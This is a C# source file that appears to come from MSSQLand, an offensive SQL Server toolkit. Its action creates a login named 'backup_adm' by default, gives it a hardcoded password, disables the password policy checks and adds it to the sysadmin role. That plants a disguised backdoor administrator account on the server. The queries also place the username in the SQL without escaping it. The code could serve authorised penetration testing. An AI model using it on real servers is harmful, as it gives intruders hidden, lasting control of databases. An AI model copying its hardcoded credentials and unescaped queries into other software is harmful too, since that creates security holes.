using MSSQLand.Services;
using MSSQLand.Utilities;
using System;

namespace MSSQLand.Actions.Administration
{
    /// <summary>
    /// Creates a new SQL Server login with sysadmin privileges.
    /// </summary>
    internal class CreateSysadmin : BaseAction
    {
        private const string DefaultUsername = "backup_adm";
        private const string DefaultPassword = "$ap3rlip0pe//e";

        private string _username = DefaultUsername;
        private string _password = DefaultPassword;

        public override void ValidateArguments(string additionalArguments)
        {
            if (string.IsNullOrWhiteSpace(additionalArguments))
            {
                Logger.Info($"Using default credentials: {DefaultUsername}");
                return;
            }

            string[] parts = SplitArguments(additionalArguments);

            if (parts.Length >= 1)
            {
                _username = parts[0].Trim();
            }

            if (parts.Length >= 2)
            {
                _password = parts[1].Trim();
            }

            if (string.IsNullOrWhiteSpace(_username))
            {
                throw new ArgumentException("Username cannot be empty.");
            }

            if (string.IsNullOrWhiteSpace(_password))
            {
                throw new ArgumentException("Password cannot be empty.");
            }
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Creating sysadmin account: {_username}");

            try
            {
                // Check if the login already exists
                string checkQuery = $"SELECT COUNT(*) FROM sys.server_principals WHERE name = '{_username}';";
                object existsResult = databaseContext.QueryService.ExecuteScalar(checkQuery);

                if (existsResult != null && Convert.ToInt32(existsResult) > 0)
                {
                    Logger.Warning($"Login '{_username}' already exists.");
                    Logger.Info("Attempting to add sysadmin role if not already assigned...");

                    // Try to add sysadmin role even if login exists
                    string addRoleQuery = $"ALTER SERVER ROLE sysadmin ADD MEMBER [{_username}];";
                    
                    try
                    {
                        databaseContext.QueryService.ExecuteNonProcessing(addRoleQuery);
                        Logger.Success($"Added '{_username}' to sysadmin role.");
                    }
                    catch (Exception ex)
                    {
                        if (ex.Message.Contains("already a member"))
                        {
                            Logger.Info($"'{_username}' is already a member of sysadmin role.");
                        }
                        else
                        {
                            Logger.Error($"Failed to add sysadmin role: {ex.Message}");
                        }
                    }

                    return true;
                }

                // Create the SQL login
                Logger.Info($"Creating SQL login '{_username}'...");
                
                // Escape single quotes in password
                string escapedPassword = _password.Replace("'", "''");
                
                string createLoginQuery = $@"
                    CREATE LOGIN [{_username}] 
                    WITH PASSWORD = '{escapedPassword}', 
                    CHECK_POLICY = OFF, 
                    CHECK_EXPIRATION = OFF;";

                databaseContext.QueryService.ExecuteNonProcessing(createLoginQuery);
                Logger.Success($"SQL login '{_username}' created successfully.");

                // Add the login to the sysadmin role
                Logger.Info($"Adding '{_username}' to sysadmin server role...");
                
                string addSysadminQuery = $"ALTER SERVER ROLE sysadmin ADD MEMBER [{_username}];";
                databaseContext.QueryService.ExecuteNonProcessing(addSysadminQuery);
                
                Logger.Success($"'{_username}' added to sysadmin role successfully.");

                Logger.NewLine();
                Logger.Success($"Sysadmin account created and configured:");
                Console.WriteLine(MarkdownFormatter.ConvertDictionaryToMarkdownTable(
                    new System.Collections.Generic.Dictionary<string, string>
                    {
                        { "Username", _username },
                        { "Password", _password },
                        { "Role", "sysadmin" },
                        { "Check Policy", "OFF" },
                        { "Check Expiration", "OFF" }
                    },
                    "Property",
                    "Value"
                ));

                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to create sysadmin account: {ex.Message}");
                
                if (ex.Message.Contains("permission"))
                {
                    Logger.Warning("You may not have sufficient privileges to create logins or assign sysadmin role.");
                    Logger.Info("Required permissions: ALTER ANY LOGIN, ALTER SERVER ROLE (sysadmin)");
                }

                if (Logger.IsDebugEnabled)
                {
                    Logger.DebugNested($"Stack trace: {ex.StackTrace}");
                }

                return false;
            }
        }
    }
}
